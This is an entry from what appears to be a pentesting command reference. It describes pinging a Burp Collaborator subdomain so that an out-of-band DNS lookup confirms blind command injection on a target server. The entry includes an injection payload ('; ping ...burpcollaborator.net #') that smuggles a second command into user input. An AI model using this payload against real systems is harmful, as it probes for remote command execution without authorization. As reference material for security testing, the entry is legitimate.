---
data: ping 637c7wji9kaqwyxtncutltrw9nfd32.burpcollaborator.net
tags:
  - reconnaissance
  - oob
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.187Z'
id: 05dab643-8334-4e9d-9400-16c0e299c8c5
verified: false
validated: true
submitted: true
---
# ping-burpcollaborator

## Command

```bash
ping 637c7wji9kaqwyxtncutltrw9nfd32.burpcollaborator.net
```

## Description

This command sends ICMP echo requests to a Burp Collaborator domain, used in blind injection scenarios to trigger a detectable DNS resolution without producing visible output, confirming command execution on the target server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | The Burp Collaborator subdomain for OOB detection | Yes |

## Examples

### Basic Usage

```bash
ping 637c7wji9kaqwyxtncutltrw9nfd32.burpcollaborator.net
```

### Advanced Usage

In a payload context, embed in user input: `; ping unique-domain.burpcollaborator.net #`

```bash
ping unique-domain.burpcollaborator.net
```

## Expected Output

On the target: No direct output, but a DNS lookup to the specified domain, observable in Burp Collaborator as an interaction record showing query details from the server's IP.

## Related

- [[Related Procedure: Inject-Command-for-Blind-Command-Injection]]
